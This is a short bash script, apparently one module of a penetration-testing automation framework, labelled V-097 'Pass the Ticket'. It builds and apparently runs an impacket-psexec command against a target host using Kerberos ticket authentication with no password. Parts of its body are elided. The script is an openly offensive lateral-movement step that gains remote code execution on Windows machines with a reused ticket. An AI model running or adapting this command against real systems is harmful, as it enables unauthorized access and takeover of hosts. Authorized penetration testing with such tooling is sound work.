#!/usr/bin/env bash
# V-097.sh — Pass the Ticket
# Category: Host, Software and internal architecture
# Tool: impacket-psexec
# Usage: bash V-097.sh <SESSION> <TARGET>
# Place at: ~/Desktop/trinetra/scripts/hexstrike/V-097.sh
set -euo pipefail

SESSION="${1:?ERROR: usage: bash V-097.sh <session> <target>}"
TARGET="${2:?ERROR: usage: bash V-097.sh <session> <target>}"
...
CMD="impacket-psexec domain/user@$TARGET -k -no-pass"

echo "[hex] V-097: Pass the Ticket → $TARGET"
...
python3 - \
    ...
    "V-097" "Pass the Ticket" "Host, Software and internal architecture" "impacket-psexec" \
